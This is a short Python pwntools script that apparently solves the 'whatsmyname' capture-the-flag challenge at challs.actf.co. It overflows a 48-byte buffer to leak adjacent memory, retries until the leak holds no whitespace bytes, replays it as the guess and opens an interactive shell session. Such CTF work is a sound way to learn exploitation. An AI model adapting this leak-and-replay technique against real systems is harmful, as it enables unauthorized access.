from pwn import *
import sys

context.log_level = 'critical'

def check(res, arr):
	for char in arr:
		if(char in res):
			print('Contains bad char!')
			return 1


while(1):
	# p = process('./whatsmyname')
	p = remote('challs.actf.co', 31223)

	p.recv()
	p.send(b'a'*48)
	p.recvuntil(b'a'*48)

	leak = p.recvuntil(b'Guess')[:-7]
	bad_chars = [b'\x09', b'\x0a', b'\x0b', b'\x0c', b'\x0d', b' ']
	if(check(leak, bad_chars)):
		p.close()
		continue
	break

p.recv()
p.sendline(leak)
print(p.recvline())

p.interactive()